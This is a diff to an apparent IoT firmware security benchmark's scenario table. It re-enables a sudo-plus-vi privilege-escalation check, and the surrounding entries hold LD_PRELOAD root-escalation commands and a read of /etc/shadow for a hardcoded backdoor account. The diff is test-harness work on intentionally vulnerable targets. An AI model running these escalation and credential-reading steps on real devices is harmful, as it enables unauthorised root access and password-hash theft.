@@ -128,18 +128,11 @@ SCENARIOS["router-cwe798-ld-preload-sudo"] = (
         "rm -f /tmp/iotbench-ldpreload-root",
         "su -s /bin/sh routerweb -c \"echo iotbench | sudo -S LD_PRELOAD=/usr/lib/iotbench/preload-marker.so /usr/bin/ldpreload-target\" 2>&1",
         "cat /tmp/iotbench-ldpreload-root 2>&1"), r"euid=0", None, None)
-# Parked: sudo consistently rejects the correct password ("iotbench") for this
-# sudoers rule after 3 retries, unlike the identical password/account used by
-# ld-preload-sudo above, which works every time. Needs a live boot to diagnose
-# (FIRMWARE=router-cwe798-vi-privilege-escalation ./scripts/run-qemu.sh and the
-# documented SSH-based manual steps) before trying another scripted fix; see
-# memory for the full history of attempts. Commented out so it reports
-# "no-spec" instead of retrying forever as "error".
-# SCENARIOS["router-cwe798-vi-privilege-escalation"] = (
-#     "vi_sudo", ("vi_sudo", "rm -f /tmp/iotbench-vi.txt",
-#                "su -s /bin/sh routerweb -c 'sudo -S /bin/busybox vi /tmp/iotbench-vi.txt'",
-#                "iotbench", r"[#\$] $"),
-#     r"uid=0\(root\)", None, None)
+SCENARIOS["router-cwe798-vi-privilege-escalation"] = (
+    "vi_sudo", ("vi_sudo", "rm -f /tmp/iotbench-vi.txt",
+               "su -s /bin/sh routerweb -c 'sudo -S /bin/busybox vi /tmp/iotbench-vi.txt'",
+               "iotbench", r"[#\$] $"),
+    r"uid=0\(root\)", None, None)
 SCENARIOS["router-cwe287-ssh-hardcoded-backdoor"] = (
     "guest", guest_steps("grep '^support:' /etc/passwd /etc/shadow 2>&1"), r"support:\$6\$", None, None)
 
